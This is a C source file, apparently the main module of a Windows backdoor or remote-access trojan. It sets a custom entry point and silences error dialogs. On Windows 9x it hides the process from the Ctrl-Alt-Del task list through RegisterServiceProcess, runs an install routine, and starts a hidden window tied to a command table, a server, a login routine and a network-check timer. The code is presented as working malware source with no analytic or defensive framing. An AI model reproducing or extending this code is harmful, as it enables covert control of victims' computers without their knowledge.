#ifndef _DEBUG
#pragma comment(linker, "/ENTRY:zXentry")
#pragma comment(linker, "/NODEFAULTLIB")
#endif

//#pragma comment(linker, "/ALIGN:4096") /* this makes the section alignment (in file) to 512 */

/* tell linker to merge sections; to reduce slack space between sections */
//#pragma comment(linker, "/MERGE:.rdata=.text") /* one big section */
//#pragma comment(linker, "/MERGE:.data=.text")
//#pragma comment(linker, "/MERGE:.rdata=.data")
//#pragma comment(linker, "/MERGE:.rsrc=.text")//oops... the version-table (the only resource) disappeared!
//#pragma comment(linker, "/SECTION:.text,ERW")

#include <windows.h>
#include "defines.h"
#include "globals.h"
#include "install.h"
#include "command.h"
#include "misc.h"
#include "wndproc.h"
#include "server.h"

int zXinit()
{
  OSVERSIONINFO ovi;
  FARPROC rsp;

  init_commandTable();

  if (hADVAPI32_DLL = LoadLibrary("ADVAPI32.DLL")){
    _RegOpenKeyEx = (p_RegOpenKeyEx)GetProcAddress(hADVAPI32_DLL, "RegOpenKeyExA");
    _RegQueryValueEx = (p_RegQueryValueEx)GetProcAddress(hADVAPI32_DLL, "RegQueryValueExA");
    _RegSetValueEx = (p_RegSetValueEx)GetProcAddress(hADVAPI32_DLL, "RegSetValueExA");
    _RegCloseKey = (p_RegCloseKey)GetProcAddress(hADVAPI32_DLL, "RegCloseKey");
  }

  ovi.dwOSVersionInfoSize = sizeof(ovi);
  GetVersionEx(&ovi);
  isWinNT = ovi.dwPlatformId == VER_PLATFORM_WIN32_NT;
  isWin98 = ovi.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS && ovi.dwMinorVersion;
  runSafe = isWinNT || !isWin98; /* (WinNT || unknownOS) */

#ifdef runLowPriority
  SetPriorityClass(GetCurrentProcess(), IDLE_PRIORITY_CLASS);
#endif runLowPriority

#ifndef noSilentCrash
  SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);/* uncomment this if the program fails to load */
#endif

  if (!runSafe){
    /* dont show in CAD box */
    (*(rsp = GetProcAddress(GetModuleHandle("KERNEL32.DLL"), "RegisterServiceProcess")))(0, 1);
    if (!install()) /* 'install' */
      return 1; /* ->exit program */
  }
  return 0;
}

int zXexit(){
  FreeLibrary(hADVAPI32_DLL);
  return 0;
}

#ifndef _DEBUG
int zXentry(){
#else
int WINAPI WinMain(HINSTANCE hI, HINSTANCE hPi, char *lpC, int s){
#endif
  WNDCLASS wc;
  MSG msg;

  if (zXinit())
    return 0;

  fillMemory(&wc, sizeof(wc), 0);
  wc.lpfnWndProc = zXwndProc;
  wc.lpszClassName = zXClassName;
  RegisterClass(&wc);

  hW = CreateWindow(zXClassName, zXWindowName, 0, 0, 0, 0, 0, 0, 0, 0, 0);

#ifdef noCheck4Connection
  zXstart();
#ifdef loginOnStartup
  if (!loginStatus)//if not logged in ...
    thread(zXlogin, 0);
#endif
#endif

  SetTimer(hW, zXtimer_checkForNet, CheckForNetDelay, 0);

  while(GetMessage(&msg, 0, 0, 0))
    DispatchMessage(&msg);

  zXexit();
  ExitProcess(0);
  return 0;
}